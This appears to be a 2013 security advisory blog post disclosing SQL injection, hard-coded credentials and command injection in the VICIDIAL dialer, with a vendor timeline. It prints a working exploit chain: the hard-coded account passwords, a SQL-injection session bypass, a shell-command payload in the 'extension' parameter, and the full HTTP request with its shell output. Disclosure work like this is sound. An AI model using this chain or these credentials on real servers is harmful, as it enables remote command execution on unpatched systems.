---
layout: post
title: "VICIDIAL: Multiple Vulnerabilities"
date: 2013-10-23 02:20
comments: true
categories: 
---

*Update:* The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468.

## Background

[VICIDIAL](http://www.vicidial.org/vicidial.php) (a.k.a. Asterisk GUI client) is an open-source dialer built on top of the Asterisk PBX. It's written in PHP, and has a significant number of security issues.

In addition to the open-source project, the company behind VICIDIAL, [The Vicidial Group](http://www.vicidial.com/), also offers VICIDIAL in a hosted environment.

At this time, the current release version **is still vulnerable**. Vendor reports hosted users are on a fixed version. Vendor proposed to release the OSS code in mid-July, as of October 23rd, no update or advisory has been released.

After discussions with other researchers, I have made the decision that after waiting more than 140 days for a release, patches, or an advisory warning users, that the next responsible step is to disclose the issue publicly.

This is not a decision I take lightly, but I believe at this point users of this application should understand the degree of risk involved, and have details so they can take action to minimize that risk.

## Overview

Tested versions: 2.7RC1, 2.7, 2.8-403a; it is likely other versions are affected.

There are three vulnerabilities that I will discuss here:

 1. Pre-Auth SQL Injection in `./apc/SCRIPT_multirecording_AJAX.php`
 2. Hard-Coded User Credentials
 3. Command Injection in `./agc/manager_send.php`

There are pre and/or post authentication SQL injection flaws in nearly every file in the `./agc` directory. The web portion is split between `./agc` (which is the 'agent' interface) and `./vicidial` (the administrative interface). My review did not include the `./vicidial` directory, though a quick glance indicates that there are likely many issues there as well.

There are many other issues; from XSS to a possible DoS by allowing an attacker to write directly to a log file until the attacker has exhausted the free space on the server.

There's also `./vicidial_mysql_errors.txt` - it might be of interest as it contains query parameters.

I will not document all of the issues that I've found; partly because I don't want to take the time, and also because I feel bad for the team at OSVDB - hundreds of entries for the same application wouldn't be fun.

## Pre-Auth SQL Injection

This is your typical, boring, SQL injection:

{% codeblock lang:php SCRIPT_multirecording_AJAX.php - Line 44 %}
<?php
...
$stmt="select campaign_rec_filename from vicidial_campaigns where campaign_id='$campaign'";
{% endcodeblock %}

The `$campaign` variable is unsanitized and passed directly to the query. This isn't the best SQL Injection ever, but it demonstrates the issue.

## Hard-Coded User Credentials

There are two accounts that are created when you install VICIDIAL that have hard coded passwords, that are used by the software. While these accounts have minimal permissions, they do allow an attacker to get to portions of the code not accessible without a valid user account.

Accounts:

 * VDAD
 * VDCL

Both accounts have the same password: `donotedit`.

## Command Injection

In multiple locations, there are calls to `passthru()` that do not perform any filtering or sanitization on the input. In this case, we are looking at `./agc/manager_send.php` line 429. 

Here is the code in question:

{% codeblock lang:php manager_send.php %}
<?php
...
if ($ACTION=="OriginateVDRelogin")
	{
	if ( ($enable_sipsak_messages > 0) and ($allow_sipsak_messages > 0) and (preg_match("/SIP/i",$protocol)) )
		{
		$CIDdate = date("ymdHis");
		$DS='-';
		$SIPSAK_prefix = 'LIN-';
		print "<!-- sending login sipsak message: $SIPSAK_prefix$VD_campaign -->\n";
		passthru("/usr/local/bin/sipsak -M -O desktop -B \"$SIPSAK_prefix$campaign\" -r 5060 -s sip:$extension@$phone_ip > /dev/null");
		$queryCID = "$SIPSAK_prefix$campaign$DS$CIDdate";

		}
	$ACTION="Originate";
	}
{% endcodeblock %}

To exploit this, the following values must be set:

 * `enable_sipsak_messages=1`
 * `allow_sipsak_messages=1`
 * `protocol=sip`
 * `ACTION=OriginateVDRelogin`
 * `session_name=AAAAAAAAAAAA` (or any other value at least 12 bytes long)
 * `server_ip=' OR '1' = '1`
 * `user=VDCL`
 * `pass=donotedit`

The payload is passed in the `extension` parameter, for my testing, I used the following:

`extension=;id;uname -a;`

As you've probably noticed, the value for `server_ip` isn't just a dummy value, it's taking advantage of a SQL Injection vulnerability on line 285:

{% codeblock lang:php manager_send.php %}
<?php
...
$stmt="SELECT count(*) from web_client_sessions where session_name='$session_name' and server_ip='$server_ip';";
{% endcodeblock %}

This allows us to bypass the check for an active session, and we use the hard coded credentials to get around the need for authentication.

When you execute this, it looks like this:

    GET http://192.168.10.131/agc/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3Bid%3Buname%20-a%3B&user=VDCL&pass=donotedit HTTP/1.1
    User-Agent: Fiddler
    Host: 192.168.10.131
    
    --
    
    HTTP/1.1 200 OK
    Date: Sun, 02 Jun 2013 23:22:38 GMT
    Server: Apache/2.2.21 (Linux/SUSE)
    X-Powered-By: PHP/5.3.8
    Cache-Control: no-cache, must-revalidate
    Pragma: no-cache
    Content-Length: 291
    Content-Type: text/html; charset=utf-8
    
    
    <!-- sending login sipsak message: LIN- -->
    uid=30(wwwrun) gid=8(www) groups=8(www)
    Linux linux-0y3h 3.1.10-1.23.1-pae #1 SMP Tue May 21 12:46:34 UTC 2013 (8645a72) i686 i686 i386 GNU/Linux
    ERROR Exten  is not valid or queryCID LIN--130602192238 is not valid, Originate command not inserted

As you can see, when you run this, the the returned text from the shell is included in the middle of the body in the server's response.

## Timeline & Vendor Response

The vendor quickly acknowledged the issues and promised quick fixes. As time has gone on, their hosted users received the security fixes, users of the open-source version remain unaware of the issue and unprotected.

 * 6/3/2013 - Vendor notified
 * 6/3/2013 - Vendor confirmed
 * 6/13/2013 - Vendor states first phase of changes complete; began rolling out fixes to hosted users.
 * 6/15/2013 - Requested release timeline.
 * 6/15/2013 - Vendor requests disclosure delay till mid-July 2013.
 * 7/3/2013 - Vendor advises second phase of changes complete and being pushed to hosted users.
 * 8/26/2013 - Requested status update.
 * 8/27/2013 - Vendor advises final phase of changes complete, hosted users update with all security changes. Expects to release OSS code in two weeks.
 * 9/20/2013 - Requested status update.
 * 9/25/2013 - Vendor advises of unrelated delay. Expected to complete work for next release by 9/30.
 * 10/23/2013 - Decision made that further delays not in the public interest.

